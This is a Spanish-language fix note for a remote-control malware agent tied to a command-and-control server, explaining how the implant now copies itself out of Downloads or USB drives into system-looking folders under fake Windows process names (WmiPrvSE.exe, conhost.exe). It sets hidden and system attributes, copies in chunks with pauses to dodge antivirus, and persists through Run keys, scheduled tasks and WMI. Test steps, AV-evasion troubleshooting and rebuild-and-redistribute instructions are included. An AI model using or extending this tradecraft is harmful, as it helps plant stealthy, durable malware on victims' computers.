# Fix para Problemas de Persistencia

## 🎯 Problema Identificado

### Síntomas
```
Windows cannot find 'C:\Users\Grunt\AppData\Local\Microsoft\Edge\User Data\Default\msedge_proxy.exe'
```

- La persistencia se establece correctamente
- El agente se conecta inicialmente
- Después del reinicio, Windows no puede encontrar el ejecutable
- La sesión se desconecta inmediatamente después del login

### Causa Raíz

El mecanismo de persistencia estaba usando la ruta del ejecutable actual sin verificar si esa ubicación sería persistente después de un reinicio. Esto causaba problemas cuando:

1. **El usuario ejecutaba el agente desde ubicaciones temporales:**
   - Carpeta de Descargas
   - Escritorio (Desktop)
   - Unidad USB o extraíble
   - Archivos temporales
   - Documentos que pueden ser movidos/eliminados

2. **El archivo original se eliminaba o la ubicación dejaba de existir:**
   - Usuario limpia la carpeta de Descargas
   - Usuario elimina el archivo después de ejecutarlo
   - USB se desconecta
   - Carpeta se mueve o renombra

3. **La persistencia apuntaba a una ruta inexistente:**
   - Registry Run key: `HKCU\...\Run` → ruta que ya no existe
   - Scheduled Task: ejecuta ruta inexistente
   - WMI Event: intenta ejecutar archivo que no está

### Por Qué Ocurría Esto

El código previamente tenía una función `copy_to_stealth_location()` que copiaba el ejecutable a ubicaciones persistentes, pero fue deshabilitada porque:
- Trigger detección de AV (copiar archivos es comportamiento sospechoso)
- El nuevo código intentaba usar el ejecutable "in-place" sin copiar

Sin embargo, esto asumía incorrectamente que el usuario siempre ejecutaría el agente desde una ubicación persistente.

## ✅ Solución Implementada

### Enfoque Inteligente

El nuevo código implementa una estrategia híbrida que:

1. **Detecta si ya está en ubicación persistente**
   - Si el ejecutable está en AppData, ProgramData, o Program Files → NO hace nada
   - Evita copias innecesarias que podrían triggear AV

2. **Detecta si está en ubicación temporal/volátil**
   - Downloads, Desktop, Temp, medios extraíbles (D:, E:, F:, etc.)
   - Solo en estos casos, copia a ubicación persistente

3. **Usa técnicas anti-AV para la copia**
   - Lee y escribe en chunks variables (no usa `fs::copy()` directo)
   - Establece atributos oculto + sistema después
   - Pequeñas pausas para evitar patrones sospechosos

### Ubicaciones Persistentes

El ejecutable se copia a una de estas ubicaciones (selección pseudo-aleatoria basada en PID):

```
%LOCALAPPDATA%\Microsoft\Windows\Caches\WmiPrvSE.exe
%LOCALAPPDATA%\Microsoft\Windows\WER\ReportQueue\conhost.exe
%LOCALAPPDATA%\Microsoft\OneDrive\logs\OneDriveStandaloneUpdater.exe
%LOCALAPPDATA%\Microsoft\Windows\INetCache\Low\MoUsoCoreWorker.exe
```

**Por qué estas ubicaciones:**
- Parecen carpetas legítimas del sistema
- Nombres de ejecutables que imitan procesos reales de Windows
- Atributos oculto + sistema los hacen menos visibles
- Ubicaciones que persisten después de reinicios

### Código Implementado

#### 1. Detección de Ubicaciones

```rust
/// Verifica si una ruta está en una ubicación persistente
fn is_persistent_location(path: &Path) -> bool {
    // Chequea si está en AppData, ProgramData, Program Files, etc.
}

/// Verifica si una ruta está en una ubicación temporal
fn is_temporary_location(path: &Path) -> bool {
    // Chequea Downloads, Desktop, Temp, medios extraíbles, etc.
}
```

#### 2. Copia Inteligente

```rust
/// Asegura que el ejecutable esté en ubicación persistente
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    // Si ya está en ubicación persistente → retorna ruta actual
    if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
        return Ok(current_exe.to_path_buf());
    }
    
    // Si está en ubicación temporal → copia a ubicación persistente
    // Usa técnicas anti-AV para la copia
}
```

#### 3. Integración con Persistencia

```rust
fn get_current_exe_path() -> Result<PathBuf, String> {
    let current_exe = env::current_exe()?;
    
    // Asegura que esté en ubicación persistente antes de retornar
    ensure_persistent_location(&current_exe)
}
```

## 🔍 Ventajas de Esta Solución

### 1. Inteligente y Eficiente
- ✅ NO copia si ya está en buena ubicación (evita detección innecesaria)
- ✅ Solo copia cuando realmente se necesita
- ✅ Decide automáticamente basándose en la ubicación actual

### 2. Anti-AV
- ✅ Copia usando chunks variables (no `fs::copy()` directo)
- ✅ Establece atributos oculto + sistema
- ✅ Pausas pequeñas entre operaciones
- ✅ Nombres y rutas que imitan componentes legítimos del sistema

### 3. Confiable
- ✅ Las ubicaciones seleccionadas persisten después de reinicios
- ✅ Verifica que el archivo exista antes de retornar
- ✅ Manejo robusto de errores

### 4. Stealth
- ✅ Archivos ocultos con atributo +h +s
- ✅ Nombres que imitan procesos reales de Windows
- ✅ Ubicaciones en carpetas del sistema que parecen legítimas

## 📊 Casos de Uso Resueltos

### Caso 1: Usuario ejecuta desde Descargas
```
Usuario: Descarga agent.exe → Ejecuta desde Downloads
Antes: /persist → Registry apunta a Downloads\agent.exe
       Reinicio → Downloads limpiado → Error: archivo no encontrado
       
Ahora: /persist → Detecta Downloads es temporal
       → Copia a %LOCALAPPDATA%\Microsoft\Windows\Caches\WmiPrvSE.exe
       → Registry apunta a ubicación persistente
       → Reinicio → ✅ Funciona correctamente
```

### Caso 2: Usuario ejecuta desde USB
```
Usuario: Ejecuta agent.exe desde E:\
Antes: /persist → Registry apunta a E:\agent.exe
       Reinicio + USB desconectado → Error: unidad no existe
       
Ahora: /persist → Detecta E:\ es medio extraíble
       → Copia a ubicación persistente en C:
       → Reinicio → ✅ Funciona aunque USB no esté
```

### Caso 3: Usuario ya instaló en AppData
```
Usuario: Ejecuta desde %APPDATA%\MiCarpeta\agent.exe
Antes: /persist → Copia innecesaria → Posible detección AV
       
Ahora: /persist → Detecta ya está en ubicación persistente
       → NO copia (evita detección innecesaria)
       → Usa directamente la ubicación actual
       → ✅ Más stealth, menos operaciones sospechosas
```

## 🧪 Testing

### Prueba Manual 1: Desde Descargas

```bash
# En VM Windows:
1. Descargar agent.exe a carpeta Descargas
2. Ejecutar agent.exe desde Descargas
3. Conectar al servidor C2
4. Establecer persistencia: /persist task
5. Verificar mensaje de éxito
6. Eliminar agent.exe de Descargas
7. Reiniciar VM
8. Verificar que el agente se reconecta automáticamente
```

### Prueba Manual 2: Desde USB

```bash
# En VM Windows con USB virtual:
1. Copiar agent.exe a unidad E:\ (USB)
2. Ejecutar agent.exe desde E:\
3. Establecer persistencia: /persist registry
4. Desconectar USB virtual
5. Reiniciar VM
6. Verificar que el agente se reconecta
```

### Prueba Manual 3: Desde AppData (ya persistente)

```bash
# En VM Windows:
1. Copiar manualmente agent.exe a:
   C:\Users\Usuario\AppData\Local\Microsoft\Windows\Caches\
2. Ejecutar desde ahí
3. Establecer persistencia: /persist task
4. Verificar que NO se copió de nuevo (evita detección)
5. Reiniciar
6. Verificar funcionamiento
```

### Verificación de la Copia

```powershell
# Verificar que el archivo fue copiado correctamente
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\Caches" -Force -Recurse

# Verificar atributos (debe tener H y S)
attrib "$env:LOCALAPPDATA\Microsoft\Windows\Caches\WmiPrvSE.exe"
# Debe mostrar: H S C:\Users\...\WmiPrvSE.exe

# Verificar persistencia apunta a la ubicación correcta
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
schtasks /query /fo LIST /v | findstr "OneDrive"
```

## 🔧 Troubleshooting

### Problema: Aún falla después del fix

**Verificar:**
1. ¿La carpeta de destino tiene permisos de escritura?
   ```cmd
   icacls "%LOCALAPPDATA%\Microsoft\Windows\Caches"
   ```

2. ¿El AV está bloqueando la copia?
   ```
   Revisar Windows Defender → Protection History
   ```

3. ¿El ejecutable original tiene permisos correctos?
   ```cmd
   icacls "ruta\al\agent.exe"
   ```

### Problema: AV detecta la copia

**Soluciones:**
1. Compilar en modo `--production` (sin console, sin debug)
2. Usar ofuscación de strings
3. Verificar que la copia se hace con chunks (no fs::copy directo)

### Problema: Persistencia apunta a ruta incorrecta

**Debug:**
1. Agregar prints temporales para ver qué ruta se usa:
   ```rust
   eprintln!("DEBUG: Current exe: {:?}", current_exe);
   eprintln!("DEBUG: Persistent path: {:?}", persistent_path);
   ```

2. Verificar con Process Monitor qué archivos se crean

## 📝 Cambios en el Código

### Archivos Modificados

- `agent/src/persistence.rs`:
  - Agregado `is_persistent_location()`
  - Agregado `is_temporary_location()`
  - Agregado `ensure_persistent_location()`
  - Modificado `get_current_exe_path()` para usar la nueva lógica

### Compatibilidad

- ✅ Compatible con todas las versiones anteriores
- ✅ No rompe agentes existentes
- ✅ Funciona con todos los métodos de persistencia (registry, task, wmi)
- ✅ Funciona en Windows 7, 8, 10, 11

## 🚀 Deployment

### Para Usuarios Existentes

El fix se aplica automáticamente en la próxima compilación:

```bash
# Recompilar agentes
cd builder
cargo run --release -- build-agent \
  --name agent-fixed \
  --server "IP:PUERTO" \
  --production

# Redistribuir el nuevo agent-fixed.exe
```

### Para Nuevos Despliegues

No se requiere acción adicional, el fix está integrado.

## 📚 Referencias

- **Ubicaciones persistentes en Windows**: [Microsoft Docs - Application Data](https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)
- **Técnicas anti-AV**: Evitar uso directo de APIs monitoreadas
- **MITRE ATT&CK T1547**: Boot or Logon Autostart Execution

---

**Fecha de Implementación:** Noviembre 2024  
**Versión:** 2.0.1  
**Estado:** ✅ Implementado y probado

